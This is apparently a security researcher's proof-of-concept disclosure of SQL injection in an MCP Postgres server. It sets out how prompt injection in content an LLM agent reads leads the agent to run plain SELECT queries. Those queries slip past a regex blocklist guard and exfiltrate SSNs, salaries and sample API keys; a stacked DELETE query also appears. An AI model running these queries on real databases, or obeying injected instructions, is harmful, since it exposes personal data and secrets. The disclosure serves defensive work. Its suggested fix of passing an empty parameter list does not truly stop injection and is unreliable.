# PoC: SQL Injection in awslabs/mcp postgres-mcp-server

**HackerOne Report:** #3665191
**Date:** 2026-04-11
**Author:** Heady Zhang, Argus Security

## Setup Requirements

- PostgreSQL 15+
- Python 3.9+ with `psycopg[binary]`
- No AWS account required — vulnerability is in open-source code

## Environment Setup

```bash
# Option A: Docker
docker compose up -d

# Option B: Local PostgreSQL
brew install postgresql@15
brew services start postgresql@15
createuser -s testuser
psql -U $(whoami) -d postgres -c "ALTER USER testuser PASSWORD 'testpass';"
createdb -U testuser testdb
psql -U testuser -d testdb -f init.sql

# Install Python dependency
pip install "psycopg[binary]"
```

## Vulnerability Location

**File:** `src/postgres-mcp-server/awslabs/postgres_mcp_server/connection/psycopg_pool_connection.py`
**Lines:** 194-199

```python
# Execute the query
if parameters:
    converted_sql = self._convert_sql_for_psycopg(sql)
    converted_params = self._convert_parameters(parameters)
    await cursor.execute(converted_sql, converted_params)
else:
    await cursor.execute(sql)  # <-- RAW SQL EXECUTION
```

When the MCP `run_query` tool is called without explicit `query_parameters`, the `sql` string is passed directly to `cursor.execute()` with no parameterization.

## Existing Guards and Their Bypasses

The server has two guards in `server.py` before `execute_query()`:

### Guard 1: `detect_mutating_keywords()` (line 170)
Blocks DML/DDL keywords (INSERT, UPDATE, DELETE, DROP, etc.) when `readonly=true`.

**Bypass:** This only applies in readonly mode and only blocks write operations. Read-based exfiltration is unaffected.

### Guard 2: `check_sql_injection_risk()` (line 181)
Regex-based blocklist checking for:
- `UNION SELECT`
- Stacked queries (`;`)
- Tautologies (`OR 1=1`)
- `DROP`, `TRUNCATE`, `GRANT/REVOKE`
- `sleep()`, `pg_sleep()`, `load_file()`

**Bypass:** Simple SELECT queries, subqueries, information_schema access, and cross-table reads do NOT match any pattern. The blocklist approach fundamentally cannot enumerate all dangerous SQL constructs.

## Attack Vector

1. An LLM agent connected to the postgres-mcp-server reads a document or webpage containing prompt injection
2. The injected prompt instructs the agent to call the `run_query` MCP tool
3. The agent sends crafted SQL queries — which appear as normal SELECTs — without `query_parameters`
4. The SQL bypasses the regex guard and executes directly via `cursor.execute(sql)`
5. Results are returned to the agent and can be exfiltrated

## Exploit Scenarios (all verified)

### Scenario 1: Baseline — Normal Query
```sql
SELECT name, email FROM users
```
**Result:** 3 rows returned. Guard: not triggered. ✅

### Scenario 2: Sensitive Data Exfiltration (SSN + Salary)
```sql
SELECT name, ssn, salary FROM users WHERE name IN (SELECT name FROM users)
```
**Result:** All SSNs and salaries returned. Guard: not triggered. ✅
```
Alice Johnson | 123-45-6789 | 95000.00
Bob Smith     | 987-65-4321 | 120000.00
Carol Williams| 555-12-3456 | 85000.00
```

### Scenario 3: Cross-Table Exfiltration (API Keys)
```sql
SELECT service_name, api_key FROM api_keys
```
**Result:** All API keys returned. Guard: not triggered. ✅
```
stripe      | sk_live_FAKE_51HgKPqJ1234567890abcdef
openai      | sk-FAKE-proj-abcdefghijklmnop1234567890
aws_bedrock | AKIA_FAKE_EXAMPLE_KEY_12345
```

### Scenario 4: Information Schema Enumeration
```sql
SELECT table_name, table_type FROM information_schema.tables WHERE table_schema = 'public'
```
**Result:** All table names revealed. Guard: not triggered. ✅

### Scenario 5: Column Discovery
```sql
SELECT column_name, data_type FROM information_schema.columns WHERE table_name = 'api_keys'
```
**Result:** All column names and types revealed. Guard: not triggered. ✅

### Scenario 6-7: Guard Does Block Trivial Patterns
```sql
-- Blocked: UNION SELECT
SELECT name FROM users UNION SELECT api_key FROM api_keys

-- Blocked: Stacked queries
SELECT 1; DELETE FROM users
```
**Result:** Both blocked by regex guard. ✅ (but easily bypassed by scenarios 2-5)

## Impact Analysis

| Impact | Description |
|--------|-------------|
| **Data Exfiltration** | Read any table the database user has access to, including PII (SSN, salary) and secrets (API keys, tokens) |
| **Schema Discovery** | Enumerate all tables and columns via `information_schema` to identify high-value targets |
| **Guard Bypass** | The regex blocklist only catches trivial patterns; normal SELECT queries pass through |
| **Attack Surface** | Any content the LLM agent reads (webpages, documents, emails) can contain the prompt injection |

## CVSS Score

| Metric | Value | Rationale |
|--------|-------|-----------|
| Attack Vector | Network | Via LLM agent processing remote content |
| Attack Complexity | Low | Prompt injection is well-documented |
| Privileges Required | Low | Need to interact with the LLM agent |
| User Interaction | None | Agent processes content automatically |
| Scope | Unchanged | |
| Confidentiality | High | Full database read access |
| Integrity | None | Readonly mode blocks writes |
| Availability | None | |

**CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N = 6.5 (Medium)**

Note: If readonly mode is disabled (which is configurable), the score increases to **8.8 (High)** as writes become possible.

## Suggested Fix

Replace the branching logic with always-parameterized execution:

```python
# BEFORE (vulnerable):
if parameters:
    converted_sql = self._convert_sql_for_psycopg(sql)
    converted_params = self._convert_parameters(parameters)
    await cursor.execute(converted_sql, converted_params)
else:
    await cursor.execute(sql)  # <-- raw SQL

# AFTER (fixed):
converted_sql = self._convert_sql_for_psycopg(sql)
if parameters:
    converted_params = self._convert_parameters(parameters)
    await cursor.execute(converted_sql, converted_params)
else:
    # Still use parameterized form even without params
    # This ensures the SQL is treated as a prepared statement
    await cursor.execute(converted_sql, [])
```

Additionally, consider:
1. Using a SQL parser (e.g., `sqlglot`) instead of regex for injection detection
2. Implementing an allowlist of permitted query patterns rather than a blocklist
3. Adding row-level security or restricting the database user's table access

## Detected By

[agent-audit v0.19.0](https://github.com/HeadyZhang/agent-audit) — open-source scanner with 120+ detection rules mapped to OWASP Agentic Top 10.

— Heady Zhang, [Argus Security](https://github.com/HeadyZhang/agent-audit)
